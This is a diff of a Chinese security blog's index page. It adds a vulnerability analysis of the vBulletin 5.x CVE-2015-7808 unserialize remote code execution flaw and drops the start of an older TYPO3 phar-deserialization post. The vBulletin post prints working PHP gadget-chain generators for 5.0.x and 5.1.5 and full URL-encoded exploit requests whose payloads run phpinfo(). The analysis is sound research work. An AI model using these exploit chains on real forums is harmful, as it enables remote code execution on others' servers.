@@ -985,6 +985,174 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="n0maj1o24">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Technical Memorandum">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">vBulletin 5.x CVE-2015-7808漏洞分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-06-21 19:40:39" itemprop="dateCreated datePublished" datetime="2020-06-21T19:40:39Z">2020-06-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-21 11:46:12" itemprop="dateModified" datetime="2021-06-21T11:46:12Z">2021-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Code-Audit/" itemprop="url" rel="index"><span itemprop="name">Code Audit</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>产生漏洞的原因源于 vBulletin 程序在处理 Ajax API 调用的时候，使用 <code>unserialize()</code> 对传递的参数值进行了反序列化操作，导致攻击者使用精心构造出的 Payload 直接导致代码执行。在分析的时候，<code>vBulletin 5.0.x</code>和<code>vBulletin 5.1.x</code>两个版本漏洞触发的条件略有不同。</p>
+<p>网上能够找到的<code>vBulletin</code>源码不多，本地搭建了基于<code>vBulletin 5.0.0</code>和<code>vBulletin 5.1.5</code>两个版本的docker环境。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先来分析一波<code>vBulletin 5.0.x</code>的漏洞利用，先看下网上提供的Payload的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_Database</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> $functions = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;functions[<span class="string">'free_result'</span>] = <span class="string">'phpinfo'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_dB_Result</span> </span>&#123;</span><br><span class="line">       <span class="keyword">protected</span> $db;</span><br><span class="line">       <span class="keyword">protected</span> $recordset;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> vB_Database();</span><br><span class="line">               <span class="keyword">$this</span>-&gt;recordset = <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> vB_dB_Result())) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>PoC的构造很重要，可以大致分析出反序列化的调用链。</p>
+<p>请求的url如下</p>
+<p><code>http://0.0.0.0:8080/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D</code></p>
+<p>通过观察服务端在处理PHP时的调用栈，可知服务端在处理上述请求时，会将 <code>ajax/api/hook/decodeArguments</code>  作为路由参数 $_REQUEST[‘routestring’] 传递给地址路由处理过程。</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin1.png" alt="vbulletin1"></p>
+<p>因其符合 <code>ajax/api/[controller]/[method]</code>  的 Ajax API 请求路由格式，会再调用<code>includes/vb5/frontend/controller/ajax.php</code>下的 <code>vB5_Frontend_Controller_Ajax</code>实例中的 <code>index()</code> 函数：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin2.png" alt="vbulletin3"></p>
+<p>然后调用<code>includes/vb5/frontend/controller/ajax.php</code>下的<code>actionApi</code>函数：<img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin12.png" alt="vbulletin12"></p>
+<p>然后调用<code>includes/api/interface/collapsed.php</code>下的<code>callApi</code>函数：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin3.png" alt="vbulletin3"></p>
+<p>接着调用<code>core/vb/api/wrapper.php</code>下的<code>__call</code>函数：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin10.png" alt="vbulletin10"></p>
+<p>接着调用<code>core/vb/api.php</code>下的<code>callNamed</code>函数：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin5.png" alt="vbulletin4"></p>
+<p>接着调用<code>core/vb/api/hook.php</code>下面的<code>decodeArguments</code>函数，其中的<code>unserialize</code>函数是漏洞的触发点，通过反序列化，我们可以使之能生成在执行环境上下文中已经定义好了的类实例，并通过寻找一个含有 <strong><em><code>__wakeup()</code>或者<br><code>__destruct()</code></em></strong> 魔术方法存在问题的类来进行利用。网上文章（文章已经不能访问）所提到的利用方法并不是这样，其使用的是继承于 PHP 迭代器类型的 <strong><em><code>vB_dB_Result</code></em></strong> 类，由于<code>$args = @unserialize($arguments)</code>  产生了一个迭代器 <code>vB_dB_Result</code>类实例，因此在后面进行 foreach  操作时会首先调用其 <code>rewind()</code>函数。</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin6.png" alt="vbulletin6"></p>
+<p>往下执行：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin7.png" alt="vbulletin7"></p>
+<p>调用<code>core/vb/db/result.php</code>下面的<code>rewind</code>函数,在 <code>rewind()</code> 函数处理过程中，会根据实例变量状态进行调用:</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin8.png" alt="vbulletin8"></p>
+<p>这里就可以通过反序列化来控制 <code>$this-&gt;recordset</code>的值，并且 <code>$this-&gt;db-&gt;free_result</code>最终会调用：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin9.png" alt="vbulletin9"></p>
+<p><code>$this-&gt;functions[&#39;free_result&#39;]</code>原本的初始化值为 “mysql_free_result”，但是由于反序列化的原因，我们也能控制 “vB_dB_Result” 类实例中的 “db” 成员，更改其对应的 <code>functions[&#39;free_result&#39;]</code>为我们想要执行的函数，因此一个任意代码执行就产生了。<img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin13.png" alt="vbulletin13"></p>
+<p>在进行测试的时候发现网上所提供的 PoC 只能复现 5.0.x 版本的 vBulletin，而 5.1.x 版本的却不可以。通过本地搭建测试环境，并使用同样的 PoC 去测试，发现在 5.1.5 版本中<code>core/vb/database.php</code>的<strong><em><code>vB_Database</code></em></strong> 被定义成了抽象类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">vB_Database</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * The type of result set to return from the database for a specific row.</span></span><br></pre></td></tr></table></figure>
+
+<p>抽象类是不能直接进行实例化的，网上提供的 PoC 却是实例化的 <code>vB_Database</code> 类作为 <code>vB_dB_Result</code> 迭代器成员 <code>db</code> 的值，在服务端进行反序列化时会因为需要恢复实例为抽象类而导致失败，这就是为什么在 5.1.x 版本上 PoC 会不成功的原因。</p>
+<p>为了解决这个问题，通过跟踪调用栈，发现程序在反序列化未定义类时会调用程序注册的 <strong><em><code>autoload()</code></em></strong>方法去动态加载类文件。这里 vBulletin 会依次调用<strong><em><code>includes/vb5/autoloader.php</code></em></strong>中的<strong><em><code>_autoload</code></em></strong>方法和 <strong><em><code>core/vb/vb.php</code></em></strong>中的 <strong><em><code>autoload()</code></em></strong>方法，成功加载即返回，失败则反序列化失败。所以要想继续使用原有 PoC 的思路来让反序列化后会执行 <strong><em><code>$this-&gt;db-&gt;free_result($this-&gt;recordset)</code></em></strong>， 则需要找到一个继承于 <strong><em><code>vB_Database</code></em></strong>抽象类的子类并且其源码文件路径能够在<strong><em><code>autoload</code></em></strong>过程中得到加载。在源码根路径下执行<strong><em><code>grep -in &quot;extends vB_Database&quot; -r . --color</code></em></strong>可以得到：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin16.png" alt="vbulletin16"></p>
+<p>来看下<code>unserialize</code>函数反序列化的细节。</p>
+<p>首先进入<code>includes/vb5/autoloader.php</code>的<code>__autoload</code>函数：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin14.png" alt="vbulletin14"></p>
+<p>可以看到对提供的类名以 “_” 进行了拆分，动态构造了加载路径。（第二次<code>autoload()</code>的过程大致相同）</p>
+<p>函数调用完成之后，进入<code>core/vb/vb.php</code>下的<code>autoload</code>函数。<img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin15.png" alt="vbulletin15"></p>
+<p>可以发现只有在反序列化 <strong><em><code>vB_Database_MySQL</code></em></strong> 和 <strong><em><code>vB_Database_MySQLi</code></em></strong>这两个基于 <code>vB_Database</code>抽象类的子类时，才能成功的动态加载其类定义所在的源码文件使得反序列化成功执行，最终才能控制参数进行任意代码执行。</p>
+<p>所以，针对 5.1.5 版本 vBulletin 的 PoC 就可以得到了，使用 <strong><em><code>vB_Database_MySQL</code></em></strong> 或者 <strong><em><code>vB_Database_MySQLi</code></em></strong>作为迭代器 <strong><em><code>vB_dB_Result</code></em></strong>成员 “db” 的值即可。具体 PoC 如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_Database_MySQL</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> $functions = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;functions[<span class="string">'free_result'</span>] = <span class="string">'assert'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_dB_Result</span> </span>&#123;</span><br><span class="line">       <span class="keyword">protected</span> $db;</span><br><span class="line">       <span class="keyword">protected</span> $recordset;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> vB_Database_MySQL();</span><br><span class="line">               <span class="keyword">$this</span>-&gt;recordset = <span class="string">'phpinfo()'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> vB_dB_Result())) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>另外，[Check Point][<a href="https://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/]在其官方博客上也公布了反序列化的另一个利用点，利用魔术方法，反序列化出一个模版对象最终调用" target="_blank" rel="noopener">https://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/]在其官方博客上也公布了反序列化的另一个利用点，利用魔术方法，反序列化出一个模版对象最终调用</a> <code>eval()</code> 函数进行执行。</p>
+<p>先来看下POC代码：</p>
+<p><code>http://172.17.0.3/ajax/api/hook/decodeArguments?arguments=O%3A7%3A%22vB_vURL%22%3A1%3A%7Bs%3A7%3A%22tmpfile%22%3BO%3A16%3A%22vB_View_AJAXHTML%22%3A2%3A%7Bs%3A7%3A%22tmpfile%22%3BN%3Bs%3A10%3A%22%00%2A%00content%22%3BO%3A12%3A%22vB5_Template%22%3A3%3A%7Bs%3A7%3A%22tmpfile%22%3BN%3Bs%3A11%3A%22%00%2A%00template%22%3Bs%3A10%3A%22widget_php%22%3Bs%3A13%3A%22%00%2A%00registered%22%3Ba%3A1%3A%7Bs%3A12%3A%22widgetConfig%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22phpinfo%28%29%3Bdie%28%29%3B%22%3B%7D%7D%7D%7D%7D</code></p>
+<p>输出序列化值的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">vB5_Template</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $tmpfile;</span><br><span class="line">        <span class="keyword">protected</span> $template;</span><br><span class="line">        <span class="keyword">protected</span> $registered = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template = <span class="string">'widget_php'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;registered[<span class="string">'widgetConfig'</span>] = <span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="string">'phpinfo();die();'</span>);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">vB_View_AJAXHTML</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $tmpfile;</span><br><span class="line">        <span class="keyword">protected</span> $content;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;content = <span class="keyword">new</span> vB5_Template();</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">vB_vURL</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $tmpfile;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tmpfile = <span class="keyword">new</span> vB_View_AJAXHTML();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> vB_vURL())) . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最终输出的是 <code>serialize(new vB_vURL())</code>的值，向类vB_vURL注入了一个public变量<code>$temfile</code>，并且赋值为类<code>vB_View_AJAXHTML</code>，而类<code>vB_View_AJAXHTML</code>的构造函数中，向其类内对象<code>$content</code>赋值类<code>vB5_Template</code>，最终的利用代码在类<code>vB5_Template</code>中<code>$templete</code>和<code>$registered</code>中，含义分别是调用模板<code>widget_php</code>和<code>$registered[&#39;widgetConfig&#39;]</code>的值为利用代码。</p>
+<p>代码执行的效果如下：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin17.png" alt="vbulletin17"></p>
+<p>下面调试分析一下：</p>
+<p>首先进入<code>core/vb/api/hook.php</code>文件的<code>vB_Api_Hook</code>类的<code>decodeArguments</code>方法，传入的值会被进行反序列化操作。变量<code>$args</code>会被赋值为<code>vB_vURL</code>类。</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin18.png" alt="vbulletin18"></p>
+<p>在foreach中，由于<code>$args</code>为对象数据结构，并且当前类（<code>vB_vURL</code>类）并没有<code>implements Iterator</code>接口，因此当php在遍历对象<code>$args</code>时，只是会遍历<code>vB_vURL</code>类的public变量，不会产生漏洞。</p>
+<p>由于要进行return操作，因此便出发了当前类（<code>vB_vURL</code>类）的析构函数。</p>
+<p><code>core/vb/vurl.php</code>下的<code>__destruct</code>函数。</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin19.png" alt="vbulletin19"></p>
+<p>由于为其<code>$tmpfile</code>赋值为一个对象，<code>file_exists</code>方法会试图把类转化为字符串，因此触发了<code>$tmpfile</code>对象的<code>__toString()</code>方法。（<strong>由于传入的是vB_View_AJAXHTML类，vB_View_AJAXHTML类继承于vB_View类，因此触发的是vB_View类的__toString方法</strong>）</p>
+<p><code>core/vb/view.php</code>下的<code>__toString</code>函数：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin20.png" alt="vbulletin20"></p>
+<p>由上文可知，当前<code>$this</code>对象其实还是<code>vB_View_AJAXHTML</code>类的对象，因此进入了<code>vB_View_AJAXHTML</code>类的<code>render()</code>方法，由于定义了<code>vB_View_AJAXHTML</code>类的<code>$content</code>类对象。</p>
+<p><code>core/vb/view/ajaxhtml.php</code>下<code>render</code>函数：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin21.png" alt="vbulletin21"></p>
+<p>类对象<code>$content</code>已经被赋值为<code>vB5_Template</code>类对象，因此会进入<code>vB5_Template</code>类的<code>render()</code>方法。</p>
+<p><code>includes/vb5/template.php</code>下<code>render</code>函数：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin22.png" alt="vbulletin22"></p>
+<p><code>vB5_Template</code>类的<code>render()</code>方法，此方法会执行<code>extract()</code>方法和<code>eval()</code>方法，并且都可以控制传入的参数，因此会导致代码执行。执行完<code>extract</code>之后，变量值如下：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin23.png" alt="vbulletin23"></p>
+<p>获取<code>template</code>的代码：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin25.png" alt="vbulletin24"></p>
+<p><code>widget_php</code>模板代码在数据库<code>template</code>表中，导出之后，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;canvas-widget default-widget custom-html-widget&quot; id&#x3D;&quot;widget_&#39; . $widgetinstanceid . &#39;&quot; data-widget-id&#x3D;&quot;&#39; . $widgetid . &#39;&quot; data-widget-instance-id&#x3D;&quot;&#39; . $widgetinstanceid . &#39;&quot;&gt;</span><br><span class="line">\</span><br><span class="line">\	&#39; . vB_Template_Runtime::includeTemplate(&#39;module_title&#39;,array(&#39;widgetConfig&#39; &#x3D;&gt; $widgetConfig, &#39;can_use_sitebuilder&#39; &#x3D;&gt; $user[&#39;can_use_sitebuilder&#39;])) . &#39;</span><br><span class="line">\</span><br><span class="line">\	&lt;div class&#x3D;&quot;widget-content&quot;&gt;</span><br><span class="line">\</span><br><span class="line">\	\	&lt;hr class&#x3D;&quot;widget-header-divider&quot; &#x2F;&gt;</span><br><span class="line">\</span><br><span class="line">\	\	&#39; . &#39;&#39;; if (!empty($widgetConfig[&#39;code&#39;]) AND !vB::getDatastore()-&gt;getOption(&#39;disable_php_rendering&#39;)) &#123;\</span><br><span class="line">\	\	\	\	\	$final_rendered .&#x3D; &#39;</span><br><span class="line">\</span><br><span class="line">\	\	\	&#39; . &#39;&#39;; $evaledPHP &#x3D; vB_Template_Runtime::parseAction(&#39;bbcode&#39;, &#39;evalCode&#39;, $widgetConfig[&#39;code&#39;]); $final_rendered .&#x3D; &#39;&#39; . &#39;</span><br><span class="line">\</span><br><span class="line">\	\	\	&#39; . $evaledPHP . &#39;</span><br><span class="line">\</span><br><span class="line">\	\	&#39;;\</span><br></pre></td></tr></table></figure>
+
+<p>继续往下执行：</p>
+<p><img src="/2020/06/22/vBulletin-5-x-CVE-2015-7808%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/vbulletin24.png" alt="vbulletin25"></p>
+<p>这样就引发代码执行。</p>
+<p>参考文献：</p>
+<p>1.<a href="https://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/" target="_blank" rel="noopener">https://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/</a></p>
+<p>2.<a href="http://blog.nsfocus.net/vbulletin-5-rce-vulnerability/" target="_blank" rel="noopener">http://blog.nsfocus.net/vbulletin-5-rce-vulnerability/</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2020/04/20/ARM%E3%80%81MIPS%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%E8%AF%95%E7%94%A8%E5%B0%8F%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1456,129 +1624,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpeg">
-      <meta itemprop="name" content="n0maj1o24">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Technical Memorandum">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">TYPO3-CORE-SA-2018-002 RCE分析</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2018-06-11 16:28:47" itemprop="dateCreated datePublished" datetime="2018-06-11T16:28:47Z">2018-06-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-14 15:06:45" itemprop="dateModified" datetime="2021-06-14T15:06:45Z">2021-06-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Code-Audit/" itemprop="url" rel="index"><span itemprop="name">Code Audit</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>这个漏洞的原因在于对phar文件的过滤不严，导致可以远程代码执行。这里涉及到phar的反序列化，具体参见 <a href="https://www.twitter.com/@_s_n_t" target="_blank" rel="noopener">Sam Thomas</a> 关于[phar unserialize][<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf]的文章。" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf]的文章。</a></p>
